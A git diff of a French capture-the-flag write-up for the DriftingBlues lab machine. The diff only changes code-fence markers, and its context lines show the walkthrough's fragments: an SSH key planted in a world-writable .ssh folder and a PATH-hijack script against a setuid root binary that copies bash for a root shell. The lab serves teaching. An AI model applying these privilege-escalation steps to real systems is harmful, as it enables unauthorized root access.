@@ -10,7 +10,7 @@ On continue sur la lignée ce cette série de CTFs avec [le troisième](https://
 
 On est toujours à mi chemin entre le réalisme et le jeu de pistes ainsi qu'une difficulté accessible pour ceux qui souhaiterait se jeter à l'eau.  
 
-```plain
+```
 Nmap scan report for 192.168.56.8 
 Host is up (0.00054s latency). 
 Not shown: 65533 closed tcp ports (reset) 
@@ -29,7 +29,7 @@ PORT   STATE SERVICE VERSION
 
 Le serveur web héberge un site d'un festival de musique Blues imaginaire. L'URL mentionnée dans le *robots.txt* nous livre le contenu suivant :  
 
-```plain
+```
 man there's a problem with ssh
 john said "it's poisonous!!! stay away!!!"
 idk if he's mentally challenged
@@ -40,13 +40,13 @@ your buddy, buddyG
 
 On suit donc cette nouvelle URL et on arrive sur ce qui est sans doute les paroles d'une chanson. En sélectionnant tout le texte ou en regardant le code source de la page on découvre écrit blanc sur blanc le texte suivant :  
 
-```plain
+```
 aW50cnVkZXI/IEwyRmtiV2x1YzJacGVHbDBMbkJvY0E9PQ==
 ```
 
 Les caractères égal en fin de chaîne trahissent l'utilisation du base64. Ceci se décode en
 
-```plain
+```
 intruder? L2FkbWluc2ZpeGl0LnBocA==
 ```
 
@@ -57,7 +57,7 @@ Le blues des logs
 
 Cette URL a un contenu similaire à ceci :  
 
-```plain
+```
 #######################################################################
 ssh auth log
 ============
@@ -83,7 +83,7 @@ Ce qui est intéressant c'est que la ligne Nmap est très certainement de notre 
 
 La seconde option semble plus valide car si j'essaye un login SSH avec un compte invalide il se passe un moment avant que n'apparaisse la ligne suivante :  
 
-```plain
+```
 Jan 20 01:55:19 driftingblues sshd[762]: Invalid user zozo from 192.168.56.1 port 59860
 ```
 
@@ -100,7 +100,7 @@ Robery
 
 Notre prochaine cible est de toute évidence l'utilisateur *robertj* présent sur le système.  
 
-```plain
+```
 www-data@driftingblues:/var/www/html$ ls /home/robertj/ -al  
 total 16 
 drwxr-xr-x 3 robertj robertj 4096 Jan  4  2021 . 
@@ -111,7 +111,7 @@ drwx---rwx 2 robertj robertj 4096 Jan  4  2021 .ssh
 
 Oh ! son dossier *.ssh* est accessible en écriture pour tous. J'utilise le tunnel ReverseSSH pour déposer ma clé publique et je peux ensuite accéder au compte sur le serveur SSH en écoute :  
 
-```plain
+```
 $ sftp -P 8888 127.0.0.1 
 devloop@127.0.0.1's password:  
 Connected to 127.0.0.1. 
@@ -161,7 +161,7 @@ Robert fait partie du clan *operators* : *uid=1000(robertj) gid=1000(robertj) gr
 
 Voyons voir les fichiers pour ce groupe :  
 
-```plain
+```
 robertj@driftingblues:~$ find / -group operators 2> /dev/null  
 /usr/bin/getinfo 
 robertj@driftingblues:~$ file /usr/bin/getinfo 
@@ -171,7 +171,7 @@ robertj@driftingblues:~$ file /usr/bin/getinfo
 
 Ce binaire est setuid root et lisible mais la commande strings n'étant pas présente je m'en remet à hexdump pour voir les potentielles chaines intéressantes dans l'exécutable :  
 
-```plain
+```
 robertj@driftingblues:~$ hexdump -C /usr/bin/getinfo
 --- snip ---
 00002010  23 23 23 23 23 23 23 23  23 23 23 0a 69 70 20 61  |###########.ip a| 
@@ -191,7 +191,7 @@ robertj@driftingblues:~$ hexdump -C /usr/bin/getinfo
 
 On est dans un scénario classique d'exploitation du PATH. Comme le binaire va chercher à exécuter la commande *cat* on va placer sur son chemin un exécutable du même nom qui sera exécuté à la place de celui attendu :  
 
-```plain
+```
 robertj@driftingblues:~$ cat cat 
 #!/bin/bash 
 cp /bin/bash /tmp/g0tr00t 
